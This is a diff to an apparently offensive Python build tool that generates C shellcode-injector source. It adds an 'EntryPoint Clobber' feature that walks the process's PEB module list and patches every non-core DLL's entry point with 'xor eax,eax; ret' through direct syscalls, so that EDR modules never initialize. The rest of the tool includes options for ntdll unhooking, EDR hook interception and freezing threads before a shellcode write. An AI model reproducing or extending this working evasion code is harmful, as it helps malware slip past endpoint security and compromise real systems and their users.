@@ -378,6 +378,7 @@ class CodeGenerator:
 #define ENABLE_EDR_FREEZE   {1 if self.config.edr_freeze else 0}
 #define ENABLE_EDR_PRELOAD  {1 if self.config.edr_preload else 0}
 #define ENABLE_FREEZE       {1 if self.config.freeze else 0}
+#define ENABLE_DISABLE_PRELOADED_EDR  {1 if self.config.disable_preloaded_edr else 0}
 #define ENABLE_HOOK_CHECK   {1 if self.config.debug else 0}
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
 
@@ -519,6 +520,18 @@ int main(int argc, char** argv) {{
         return -1;
     }}
     LOG_SUCCESS("Environment checks passed");
+#endif
+    
+    // ========================================================================
+    // Phase 2.6: Disable Preloaded EDR Modules (EntryPoint Clobber)
+    // ========================================================================
+#if ENABLE_DISABLE_PRELOADED_EDR
+    LOG_PHASE("Phase 2.6: Disabling preloaded EDR module entry points");
+    if (!DisablePreloadedEdrModules()) {{
+        LOG_ERROR("DisablePreloadedEdrModules failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("Preloaded EDR module entry points clobbered");
+    }}
 #endif
     
     // ========================================================================
@@ -3545,6 +3558,11 @@ BOOL UnhookNtdll(VOID);
 // ============================================================================
 BOOL PerformEDRPreload(VOID);
 
+// ============================================================================
+// Disable Preloaded EDR Modules (EntryPoint Clobber)
+// ============================================================================
+BOOL DisablePreloadedEdrModules(VOID);
+
 #ifdef __cplusplus
 }
 #endif
@@ -4114,6 +4132,127 @@ BOOL PerformEDRPreload(VOID) {
 
     return TRUE;
 }
+'''
+        if self.config.disable_preloaded_edr:
+            # Pre-compute DJB2 hashes (seed 0x1505) of known-good DLL names
+            def _djb2_wide(name: str) -> int:
+                h = 0x1505
+                for c in name.lower():
+                    h = ((h << 5) + h) + (ord(c) & 0xFF)
+                    h &= 0xFFFFFFFFFFFFFFFF
+                return h
+
+            h_ntdll      = _djb2_wide('ntdll.dll')
+            h_kernel32   = _djb2_wide('kernel32.dll')
+            h_kernelbase = _djb2_wide('kernelbase.dll')
+
+            base += f'''
+// ============================================================================
+// DisablePreloadedEdrModules - EntryPoint Clobber
+// Walks PEB InMemoryOrderModuleList and writes xor eax,eax; ret to the
+// EntryPoint of every loaded DLL that is NOT ntdll/kernel32/kernelbase.
+// Pre-computed DjbHashW constants (seed 0x1505, lowercase wide name):
+//   ntdll.dll       0x{h_ntdll:016X}ULL
+//   kernel32.dll    0x{h_kernel32:016X}ULL
+//   kernelbase.dll  0x{h_kernelbase:016X}ULL
+// ============================================================================
+
+static DWORD64 DjbHashW(LPCWSTR str) {{
+    DWORD64 hash = 0x1505ULL;
+    while (*str) {{
+        WCHAR c = *str++;
+        if (c >= L\'A\' && c <= L\'Z\') c += 32;
+        hash = ((hash << 5) + hash) + (unsigned char)c;
+    }}
+    return hash;
+}}
+
+// Offset of InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY
+#define LDR_INMEMORY_ORDER_LINKS_OFFSET 0x10
+
+BOOL DisablePreloadedEdrModules(VOID) {{
+    // Known-good module hashes (pre-computed at build time)
+    static const DWORD64 allowList[] = {{
+        0x{h_ntdll:016X}ULL,       // ntdll.dll
+        0x{h_kernel32:016X}ULL,    // kernel32.dll
+        0x{h_kernelbase:016X}ULL,  // kernelbase.dll
+    }};
+    static const DWORD allowCount = (DWORD)(sizeof(allowList) / sizeof(allowList[0]));
+
+    // xor eax, eax; ret
+    static const BYTE gadget[] = {{ 0x33, 0xC0, 0xC3 }};
+
+    // Walk TEB->PEB->Ldr->InMemoryOrderModuleList
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb || !pPeb->Ldr)
+        return FALSE;
+
+    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY pEntry = pHead->Flink;
+
+    while (pEntry && pEntry != pHead) {{
+        // CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks):
+        // subtract the field offset to recover the struct base pointer.
+        PLDR_DATA_TABLE_ENTRY pLdr =
+            (PLDR_DATA_TABLE_ENTRY)((PBYTE)pEntry - LDR_INMEMORY_ORDER_LINKS_OFFSET);
+
+        PVOID entryPoint = pLdr->EntryPoint;
+
+        // Skip entries with NULL EntryPoint (e.g., the EXE itself often has one,
+        // but we guard it here too)
+        if (entryPoint != NULL && pLdr->BaseDllName.Buffer != NULL) {{
+            DWORD64 hash = DjbHashW(pLdr->BaseDllName.Buffer);
+
+            // Check allow-list
+            BOOL bAllowed = FALSE;
+            for (DWORD i = 0; i < allowCount; i++) {{
+                if (allowList[i] == hash) {{ bAllowed = TRUE; break; }}
+            }}
+
+            if (!bAllowed) {{
+                // Change protection, overwrite EntryPoint, restore
+                PVOID  pAddr     = entryPoint;
+                SIZE_T regionSz  = sizeof(gadget);
+                ULONG  oldProt   = 0;
+
+                PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+                NTSTATUS st = NtProtectVirtualMemory(
+                    (HANDLE)-1, &pAddr, &regionSz, PAGE_EXECUTE_READWRITE, &oldProt);
+
+                if (NT_SUCCESS(st)) {{
+                    memcpy(entryPoint, gadget, sizeof(gadget));
+
+                    // Restore original protection
+                    pAddr    = entryPoint;
+                    regionSz = sizeof(gadget);
+                    PrepareNextSyscall(IDX_NtProtectVirtualMemory);
+                    NtProtectVirtualMemory(
+                        (HANDLE)-1, &pAddr, &regionSz, oldProt, &oldProt);
+
+                    // Defense-in-depth: zero the LDR EntryPoint pointer so the
+                    // loader will not attempt to call DllMain even if the gadget
+                    // write above is ever reverted (e.g., by a competing hook).
+                    pLdr->EntryPoint = NULL;
+
+#if DEBUG_BUILD
+                    printf("[+] Clobbered EntryPoint of: %ls\\n",
+                           pLdr->BaseDllName.Buffer);
+#endif
+                }}
+#if DEBUG_BUILD
+                else {{
+                    printf("[!] NtProtectVirtualMemory failed for %ls: 0x%08X\\n",
+                           pLdr->BaseDllName.Buffer, st);
+                }}
+#endif
+            }}
+        }}
+
+        pEntry = pEntry->Flink;
+    }}
+
+    return TRUE;
+}}
 '''
         return base
 
@@ -5019,6 +5158,9 @@ Injection Methods:
     evasion_group.add_argument('--edr-preload', action='store_true', default=False,
                                help='Prevent EDR user-mode hooks via AvrfpAPILookupCallbackRoutine intercept (default: disabled)')
     
+    evasion_group.add_argument('--disable-preloaded-edr', action='store_true', default=False,
+                               help='Clobber EntryPoints of non-essential loaded DLLs to prevent EDR DllMain initialization')
+    
     evasion_group.add_argument('--freeze', action='store_true', default=False,
                                help='Freeze all remote threads before shellcode write (default: off)')
     
@@ -5080,6 +5222,7 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.edr_freeze = args.edr_freeze
     config.edr_preload = args.edr_preload
     config.freeze = args.freeze
+    config.disable_preloaded_edr = args.disable_preloaded_edr
     
     return config
 
@@ -5131,6 +5274,7 @@ def main():
         if args.unhook:                           config.unhook           = True
         if args.edr_freeze:                       config.edr_freeze       = True
         if args.edr_preload:                      config.edr_preload      = True
+        if args.disable_preloaded_edr:            config.disable_preloaded_edr = True
         if args.freeze:                           config.freeze           = True
         if args.debug:                            config.debug            = True
         if args.sleep_obf:                        config.sleep_obfuscation = True
